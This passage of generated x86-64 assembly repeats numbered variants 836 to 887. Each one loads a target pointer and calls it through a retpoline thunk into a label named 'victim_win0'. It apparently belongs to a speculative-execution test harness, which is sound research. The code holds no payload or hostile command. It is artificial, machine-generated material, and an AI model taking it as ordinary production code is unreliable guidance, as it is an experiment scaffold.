	callq	.Lgg_retpol_setup_000835
.Lgg_retpol_cap_000835:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000835
.Lgg_retpol_setup_000835:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000835:
	jmp	.Lvictim_win0_continue
## Variant 836
.Lvictim_win0_var836:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000836
	jmp	.Lgg_retpol_after_000836
.Lgg_retpol_thunk_000836:
	callq	.Lgg_retpol_setup_000836
.Lgg_retpol_cap_000836:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000836
.Lgg_retpol_setup_000836:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000836:
	jmp	.Lvictim_win0_continue
## Variant 837
.Lvictim_win0_var837:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000837
	jmp	.Lgg_retpol_after_000837
.Lgg_retpol_thunk_000837:
	callq	.Lgg_retpol_setup_000837
.Lgg_retpol_cap_000837:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000837
.Lgg_retpol_setup_000837:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000837:
	jmp	.Lvictim_win0_continue
## Variant 838
.Lvictim_win0_var838:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000838
	jmp	.Lgg_retpol_after_000838
.Lgg_retpol_thunk_000838:
	callq	.Lgg_retpol_setup_000838
.Lgg_retpol_cap_000838:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000838
.Lgg_retpol_setup_000838:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000838:
	jmp	.Lvictim_win0_continue
## Variant 839
.Lvictim_win0_var839:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000839
	jmp	.Lgg_retpol_after_000839
.Lgg_retpol_thunk_000839:
	callq	.Lgg_retpol_setup_000839
.Lgg_retpol_cap_000839:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000839
.Lgg_retpol_setup_000839:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000839:
	jmp	.Lvictim_win0_continue
## Variant 840
.Lvictim_win0_var840:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000840
	jmp	.Lgg_retpol_after_000840
.Lgg_retpol_thunk_000840:
	callq	.Lgg_retpol_setup_000840
.Lgg_retpol_cap_000840:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000840
.Lgg_retpol_setup_000840:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000840:
	jmp	.Lvictim_win0_continue
## Variant 841
.Lvictim_win0_var841:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000841
	jmp	.Lgg_retpol_after_000841
.Lgg_retpol_thunk_000841:
	callq	.Lgg_retpol_setup_000841
.Lgg_retpol_cap_000841:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000841
.Lgg_retpol_setup_000841:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000841:
	jmp	.Lvictim_win0_continue
## Variant 842
.Lvictim_win0_var842:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000842
	jmp	.Lgg_retpol_after_000842
.Lgg_retpol_thunk_000842:
	callq	.Lgg_retpol_setup_000842
.Lgg_retpol_cap_000842:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000842
.Lgg_retpol_setup_000842:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000842:
	jmp	.Lvictim_win0_continue
## Variant 843
.Lvictim_win0_var843:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000843
	jmp	.Lgg_retpol_after_000843
.Lgg_retpol_thunk_000843:
	callq	.Lgg_retpol_setup_000843
.Lgg_retpol_cap_000843:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000843
.Lgg_retpol_setup_000843:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000843:
	jmp	.Lvictim_win0_continue
## Variant 844
.Lvictim_win0_var844:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000844
	jmp	.Lgg_retpol_after_000844
.Lgg_retpol_thunk_000844:
	callq	.Lgg_retpol_setup_000844
.Lgg_retpol_cap_000844:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000844
.Lgg_retpol_setup_000844:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000844:
	jmp	.Lvictim_win0_continue
## Variant 845
.Lvictim_win0_var845:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000845
	jmp	.Lgg_retpol_after_000845
.Lgg_retpol_thunk_000845:
	callq	.Lgg_retpol_setup_000845
.Lgg_retpol_cap_000845:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000845
.Lgg_retpol_setup_000845:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000845:
	jmp	.Lvictim_win0_continue
## Variant 846
.Lvictim_win0_var846:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000846
	jmp	.Lgg_retpol_after_000846
.Lgg_retpol_thunk_000846:
	callq	.Lgg_retpol_setup_000846
.Lgg_retpol_cap_000846:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000846
.Lgg_retpol_setup_000846:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000846:
	jmp	.Lvictim_win0_continue
## Variant 847
.Lvictim_win0_var847:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000847
	jmp	.Lgg_retpol_after_000847
.Lgg_retpol_thunk_000847:
	callq	.Lgg_retpol_setup_000847
.Lgg_retpol_cap_000847:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000847
.Lgg_retpol_setup_000847:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000847:
	jmp	.Lvictim_win0_continue
## Variant 848
.Lvictim_win0_var848:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000848
	jmp	.Lgg_retpol_after_000848
.Lgg_retpol_thunk_000848:
	callq	.Lgg_retpol_setup_000848
.Lgg_retpol_cap_000848:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000848
.Lgg_retpol_setup_000848:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000848:
	jmp	.Lvictim_win0_continue
## Variant 849
.Lvictim_win0_var849:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000849
	jmp	.Lgg_retpol_after_000849
.Lgg_retpol_thunk_000849:
	callq	.Lgg_retpol_setup_000849
.Lgg_retpol_cap_000849:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000849
.Lgg_retpol_setup_000849:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000849:
	jmp	.Lvictim_win0_continue
## Variant 850
.Lvictim_win0_var850:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000850
	jmp	.Lgg_retpol_after_000850
.Lgg_retpol_thunk_000850:
	callq	.Lgg_retpol_setup_000850
.Lgg_retpol_cap_000850:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000850
.Lgg_retpol_setup_000850:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000850:
	jmp	.Lvictim_win0_continue
## Variant 851
.Lvictim_win0_var851:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000851
	jmp	.Lgg_retpol_after_000851
.Lgg_retpol_thunk_000851:
	callq	.Lgg_retpol_setup_000851
.Lgg_retpol_cap_000851:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000851
.Lgg_retpol_setup_000851:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000851:
	jmp	.Lvictim_win0_continue
## Variant 852
.Lvictim_win0_var852:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000852
	jmp	.Lgg_retpol_after_000852
.Lgg_retpol_thunk_000852:
	callq	.Lgg_retpol_setup_000852
.Lgg_retpol_cap_000852:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000852
.Lgg_retpol_setup_000852:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000852:
	jmp	.Lvictim_win0_continue
## Variant 853
.Lvictim_win0_var853:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000853
	jmp	.Lgg_retpol_after_000853
.Lgg_retpol_thunk_000853:
	callq	.Lgg_retpol_setup_000853
.Lgg_retpol_cap_000853:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000853
.Lgg_retpol_setup_000853:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000853:
	jmp	.Lvictim_win0_continue
## Variant 854
.Lvictim_win0_var854:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000854
	jmp	.Lgg_retpol_after_000854
.Lgg_retpol_thunk_000854:
	callq	.Lgg_retpol_setup_000854
.Lgg_retpol_cap_000854:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000854
.Lgg_retpol_setup_000854:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000854:
	jmp	.Lvictim_win0_continue
## Variant 855
.Lvictim_win0_var855:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000855
	jmp	.Lgg_retpol_after_000855
.Lgg_retpol_thunk_000855:
	callq	.Lgg_retpol_setup_000855
.Lgg_retpol_cap_000855:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000855
.Lgg_retpol_setup_000855:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000855:
	jmp	.Lvictim_win0_continue
## Variant 856
.Lvictim_win0_var856:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000856
	jmp	.Lgg_retpol_after_000856
.Lgg_retpol_thunk_000856:
	callq	.Lgg_retpol_setup_000856
.Lgg_retpol_cap_000856:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000856
.Lgg_retpol_setup_000856:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000856:
	jmp	.Lvictim_win0_continue
## Variant 857
.Lvictim_win0_var857:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000857
	jmp	.Lgg_retpol_after_000857
.Lgg_retpol_thunk_000857:
	callq	.Lgg_retpol_setup_000857
.Lgg_retpol_cap_000857:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000857
.Lgg_retpol_setup_000857:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000857:
	jmp	.Lvictim_win0_continue
## Variant 858
.Lvictim_win0_var858:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000858
	jmp	.Lgg_retpol_after_000858
.Lgg_retpol_thunk_000858:
	callq	.Lgg_retpol_setup_000858
.Lgg_retpol_cap_000858:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000858
.Lgg_retpol_setup_000858:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000858:
	jmp	.Lvictim_win0_continue
## Variant 859
.Lvictim_win0_var859:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000859
	jmp	.Lgg_retpol_after_000859
.Lgg_retpol_thunk_000859:
	callq	.Lgg_retpol_setup_000859
.Lgg_retpol_cap_000859:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000859
.Lgg_retpol_setup_000859:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000859:
	jmp	.Lvictim_win0_continue
## Variant 860
.Lvictim_win0_var860:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000860
	jmp	.Lgg_retpol_after_000860
.Lgg_retpol_thunk_000860:
	callq	.Lgg_retpol_setup_000860
.Lgg_retpol_cap_000860:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000860
.Lgg_retpol_setup_000860:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000860:
	jmp	.Lvictim_win0_continue
## Variant 861
.Lvictim_win0_var861:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000861
	jmp	.Lgg_retpol_after_000861
.Lgg_retpol_thunk_000861:
	callq	.Lgg_retpol_setup_000861
.Lgg_retpol_cap_000861:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000861
.Lgg_retpol_setup_000861:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000861:
	jmp	.Lvictim_win0_continue
## Variant 862
.Lvictim_win0_var862:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000862
	jmp	.Lgg_retpol_after_000862
.Lgg_retpol_thunk_000862:
	callq	.Lgg_retpol_setup_000862
.Lgg_retpol_cap_000862:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000862
.Lgg_retpol_setup_000862:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000862:
	jmp	.Lvictim_win0_continue
## Variant 863
.Lvictim_win0_var863:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000863
	jmp	.Lgg_retpol_after_000863
.Lgg_retpol_thunk_000863:
	callq	.Lgg_retpol_setup_000863
.Lgg_retpol_cap_000863:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000863
.Lgg_retpol_setup_000863:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000863:
	jmp	.Lvictim_win0_continue
## Variant 864
.Lvictim_win0_var864:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000864
	jmp	.Lgg_retpol_after_000864
.Lgg_retpol_thunk_000864:
	callq	.Lgg_retpol_setup_000864
.Lgg_retpol_cap_000864:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000864
.Lgg_retpol_setup_000864:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000864:
	jmp	.Lvictim_win0_continue
## Variant 865
.Lvictim_win0_var865:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000865
	jmp	.Lgg_retpol_after_000865
.Lgg_retpol_thunk_000865:
	callq	.Lgg_retpol_setup_000865
.Lgg_retpol_cap_000865:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000865
.Lgg_retpol_setup_000865:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000865:
	jmp	.Lvictim_win0_continue
## Variant 866
.Lvictim_win0_var866:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000866
	jmp	.Lgg_retpol_after_000866
.Lgg_retpol_thunk_000866:
	callq	.Lgg_retpol_setup_000866
.Lgg_retpol_cap_000866:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000866
.Lgg_retpol_setup_000866:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000866:
	jmp	.Lvictim_win0_continue
## Variant 867
.Lvictim_win0_var867:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000867
	jmp	.Lgg_retpol_after_000867
.Lgg_retpol_thunk_000867:
	callq	.Lgg_retpol_setup_000867
.Lgg_retpol_cap_000867:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000867
.Lgg_retpol_setup_000867:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000867:
	jmp	.Lvictim_win0_continue
## Variant 868
.Lvictim_win0_var868:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000868
	jmp	.Lgg_retpol_after_000868
.Lgg_retpol_thunk_000868:
	callq	.Lgg_retpol_setup_000868
.Lgg_retpol_cap_000868:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000868
.Lgg_retpol_setup_000868:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000868:
	jmp	.Lvictim_win0_continue
## Variant 869
.Lvictim_win0_var869:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000869
	jmp	.Lgg_retpol_after_000869
.Lgg_retpol_thunk_000869:
	callq	.Lgg_retpol_setup_000869
.Lgg_retpol_cap_000869:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000869
.Lgg_retpol_setup_000869:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000869:
	jmp	.Lvictim_win0_continue
## Variant 870
.Lvictim_win0_var870:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000870
	jmp	.Lgg_retpol_after_000870
.Lgg_retpol_thunk_000870:
	callq	.Lgg_retpol_setup_000870
.Lgg_retpol_cap_000870:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000870
.Lgg_retpol_setup_000870:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000870:
	jmp	.Lvictim_win0_continue
## Variant 871
.Lvictim_win0_var871:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000871
	jmp	.Lgg_retpol_after_000871
.Lgg_retpol_thunk_000871:
	callq	.Lgg_retpol_setup_000871
.Lgg_retpol_cap_000871:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000871
.Lgg_retpol_setup_000871:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000871:
	jmp	.Lvictim_win0_continue
## Variant 872
.Lvictim_win0_var872:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000872
	jmp	.Lgg_retpol_after_000872
.Lgg_retpol_thunk_000872:
	callq	.Lgg_retpol_setup_000872
.Lgg_retpol_cap_000872:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000872
.Lgg_retpol_setup_000872:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000872:
	jmp	.Lvictim_win0_continue
## Variant 873
.Lvictim_win0_var873:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000873
	jmp	.Lgg_retpol_after_000873
.Lgg_retpol_thunk_000873:
	callq	.Lgg_retpol_setup_000873
.Lgg_retpol_cap_000873:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000873
.Lgg_retpol_setup_000873:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000873:
	jmp	.Lvictim_win0_continue
## Variant 874
.Lvictim_win0_var874:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000874
	jmp	.Lgg_retpol_after_000874
.Lgg_retpol_thunk_000874:
	callq	.Lgg_retpol_setup_000874
.Lgg_retpol_cap_000874:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000874
.Lgg_retpol_setup_000874:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000874:
	jmp	.Lvictim_win0_continue
## Variant 875
.Lvictim_win0_var875:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000875
	jmp	.Lgg_retpol_after_000875
.Lgg_retpol_thunk_000875:
	callq	.Lgg_retpol_setup_000875
.Lgg_retpol_cap_000875:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000875
.Lgg_retpol_setup_000875:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000875:
	jmp	.Lvictim_win0_continue
## Variant 876
.Lvictim_win0_var876:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000876
	jmp	.Lgg_retpol_after_000876
.Lgg_retpol_thunk_000876:
	callq	.Lgg_retpol_setup_000876
.Lgg_retpol_cap_000876:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000876
.Lgg_retpol_setup_000876:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000876:
	jmp	.Lvictim_win0_continue
## Variant 877
.Lvictim_win0_var877:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000877
	jmp	.Lgg_retpol_after_000877
.Lgg_retpol_thunk_000877:
	callq	.Lgg_retpol_setup_000877
.Lgg_retpol_cap_000877:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000877
.Lgg_retpol_setup_000877:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000877:
	jmp	.Lvictim_win0_continue
## Variant 878
.Lvictim_win0_var878:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000878
	jmp	.Lgg_retpol_after_000878
.Lgg_retpol_thunk_000878:
	callq	.Lgg_retpol_setup_000878
.Lgg_retpol_cap_000878:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000878
.Lgg_retpol_setup_000878:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000878:
	jmp	.Lvictim_win0_continue
## Variant 879
.Lvictim_win0_var879:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000879
	jmp	.Lgg_retpol_after_000879
.Lgg_retpol_thunk_000879:
	callq	.Lgg_retpol_setup_000879
.Lgg_retpol_cap_000879:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000879
.Lgg_retpol_setup_000879:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000879:
	jmp	.Lvictim_win0_continue
## Variant 880
.Lvictim_win0_var880:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000880
	jmp	.Lgg_retpol_after_000880
.Lgg_retpol_thunk_000880:
	callq	.Lgg_retpol_setup_000880
.Lgg_retpol_cap_000880:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000880
.Lgg_retpol_setup_000880:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000880:
	jmp	.Lvictim_win0_continue
## Variant 881
.Lvictim_win0_var881:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000881
	jmp	.Lgg_retpol_after_000881
.Lgg_retpol_thunk_000881:
	callq	.Lgg_retpol_setup_000881
.Lgg_retpol_cap_000881:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000881
.Lgg_retpol_setup_000881:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000881:
	jmp	.Lvictim_win0_continue
## Variant 882
.Lvictim_win0_var882:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000882
	jmp	.Lgg_retpol_after_000882
.Lgg_retpol_thunk_000882:
	callq	.Lgg_retpol_setup_000882
.Lgg_retpol_cap_000882:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000882
.Lgg_retpol_setup_000882:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000882:
	jmp	.Lvictim_win0_continue
## Variant 883
.Lvictim_win0_var883:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000883
	jmp	.Lgg_retpol_after_000883
.Lgg_retpol_thunk_000883:
	callq	.Lgg_retpol_setup_000883
.Lgg_retpol_cap_000883:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000883
.Lgg_retpol_setup_000883:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000883:
	jmp	.Lvictim_win0_continue
## Variant 884
.Lvictim_win0_var884:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000884
	jmp	.Lgg_retpol_after_000884
.Lgg_retpol_thunk_000884:
	callq	.Lgg_retpol_setup_000884
.Lgg_retpol_cap_000884:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000884
.Lgg_retpol_setup_000884:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000884:
	jmp	.Lvictim_win0_continue
## Variant 885
.Lvictim_win0_var885:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000885
	jmp	.Lgg_retpol_after_000885
.Lgg_retpol_thunk_000885:
	callq	.Lgg_retpol_setup_000885
.Lgg_retpol_cap_000885:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000885
.Lgg_retpol_setup_000885:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000885:
	jmp	.Lvictim_win0_continue
## Variant 886
.Lvictim_win0_var886:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000886
	jmp	.Lgg_retpol_after_000886
.Lgg_retpol_thunk_000886:
	callq	.Lgg_retpol_setup_000886
.Lgg_retpol_cap_000886:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000886
.Lgg_retpol_setup_000886:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000886:
	jmp	.Lvictim_win0_continue
## Variant 887
.Lvictim_win0_var887:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000887
	jmp	.Lgg_retpol_after_000887
.Lgg_retpol_thunk_000887:
	callq	.Lgg_retpol_setup_000887
.Lgg_retpol_cap_000887:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000887
